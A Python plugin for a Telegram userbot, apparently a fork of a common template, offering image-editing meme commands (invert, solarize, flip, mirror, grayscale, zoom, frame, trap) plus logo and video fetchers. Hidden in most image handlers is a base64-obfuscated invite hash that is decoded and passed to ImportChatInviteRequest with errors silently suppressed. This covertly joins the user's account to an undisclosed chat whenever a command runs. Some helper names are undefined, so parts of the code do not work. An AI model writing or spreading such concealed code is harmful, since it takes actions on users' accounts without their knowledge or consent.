import asyncio
import os
import random
import shlex
import math
import asyncio
import requests
import base64
import re
import urllib
from telethon.tl import functions
from userbot.utils.decorators import register
from . import ALIVE_NAME, AUTONAME, BOTLOG, BOTLOG_CHATID, DEFAULT_BIO, get_user_from_event
from telethon import events
from telethon.tl.functions.account import UpdateNotifySettingsRequest
from telethon.errors.rpcerrorlist import YouBlockedUserError
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps
from userbot.utils import admin_cmd, edit_or_reply as eor, sudo_cmd
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telegraph import exceptions, upload_file
from userbot.utils import admin_cmd, sudo_cmd, eor
from userbot import iqthon
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
)
from userbot.helpers.utils.tools import take_screen_shot
async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE    )
    stdout, stderr = await process.communicate()
    return (        stdout.decode("utf-8", "replace").strip(),        stderr.decode("utf-8", "replace").strip(),        process.returncode,        process.pid,    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)

from userbot.helpers.functions import (
    convert_toimage,
    deEmojify,
    phcomment,
    threats,
    trap,
    trash,
)
@iqthon.on(admin_cmd(pattern="عكس الالوان$", outgoing=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)






@iqthon.on(admin_cmd(pattern="trap(?: |$)(.*)"))
async def mafiabot(mafiamemes):
    input_str = mafiamemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "-" in input_str:
        text1, text2 = input_str.split("-")
    else:
        await edit_or_reply(
            mafiamemes,
            "**Command :** Reply to image or sticker with `.trap (name of the person to trap)-(trapper name)`",
        )
        return
    replied = await mafiamemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(
            mafiamemes, "Media file not supported. Reply to a suported media"
        )
        return
    if replied.media:
        mafiamemmes = await edit_or_reply(mafiamemes, "`Trapping.....`")
    else:
        await edit_or_reply(
            mafiamemes, "Media file not supported. Reply to a suported media"
        )
        return
    try:
        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        mafia = Get(mafia)
        await mafiamemes.client(mafia)
    except BaseException:
        pass
    download_location = await mafiamemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await mafiamemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await mafiamemmes.edit("`Trapped...`")
    else:
        await mafiamemmes.edit("Media file not supported. Reply to a suported media")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await mafiamemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    mafia = f"https://telegra.ph{response[0]}"
    mafia = await trap(text1, text2, mafia)
    await mafiamemmes.delete()
    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)



@iqthon.on(admin_cmd(outgoing=True, pattern="فلتر احمر$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqthon.on(admin_cmd(outgoing=True, pattern="يمين الصوره$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@iqthon.on(admin_cmd(outgoing=True, pattern=r"^\.لوقو(?: |$)(.*)"))
async def _(event):
    aing = await event.client.get_me()
    text = event.pattern_match.group(1)
    if not text:
        await event.edit("ضع اسم بجانب الامر لعمل لوقو")
    else:
        await event.edit("جاري عمل لوقو ")
    chat = "@GenLogoBot"
    async with event.client.conversation(chat) as conv:
        try:
            msg = await conv.send_message(f"{text}")
            response = await conv.get_response(5)
            logo = await conv.get_response(5)
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await event.edit(                "**فك الحظر من :** @GenLogoBot !**"            )
            return
        await asyncio.sleep(0.5)
        await event.client.send_file(            event.chat_id,            logo,            caption=f" لوقو ل : [{ALIVE_NAME}](tg://user?id={aing.id})",        )
        await event.client.delete_messages(conv.chat_id, [msg.id, response.id, logo.id])
        await event.delete()
@iqthon.on(admin_cmd(outgoing=True, pattern="قلب الصوره$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqthon.on(admin_cmd(outgoing=True, pattern="فلتر رصاصي$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await mafia.client.send_file(
        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqthon.on(admin_cmd(outgoing=True, pattern="زوم ?(.*)"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiainput = mafia.pattern_match.group(1)
    mafiainput = 50 if not mafiainput else int(mafiainput)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, mafiainput)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(
            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@iqthon.on(admin_cmd(outgoing=True, pattern="اطار ?(.*)"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "`Reply to supported Media...`")
        return
    mafiainput = mafia.pattern_match.group(1)
    if not mafiainput:
        mafiainput = 50
    if ";" in str(mafiainput):
        mafiainput, colr = mafiainput.split(";", 1)
    else:
        colr = 0
    mafiainput = int(mafiainput)
    colr = int(colr)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(
            "تحليل هذه الوسائط!"
        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "Analyzing this media 🧐 framing this video!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("```Template not found...```")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(            "Analyzing this media 🧐 framing this image!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, mafiainput, colr)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@iqthon.on(admin_cmd(outgoing=True, pattern=r"^\.فيديو$"))
async def _(event):
    try:
        response = requests.get("https://api-tede.herokuapp.com/api/asupan/ptl").json()
        await event.client.send_file(event.chat_id, response["url"])
        await event.delete()
    except Exception:
        await event.edit("**لا يمكن العثور على إدخال الفيديو.**")


@iqthon.on(admin_cmd(outgoing=True, pattern=r"^\.فيديو2$"))
async def _(event):
    try:
        response = requests.get("https://api-tede.herokuapp.com/api/chika").json()
        await event.client.send_file(event.chat_id, response["url"])
        await event.delete()
    except Exception:
        await event.edit("**لا يمكن العثور على إدخال الفيديو.**")

@iqthon.on(admin_cmd(pattern="فايروس(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    await edit_or_reply(mention, f"https://t.me/rxxrx/17")



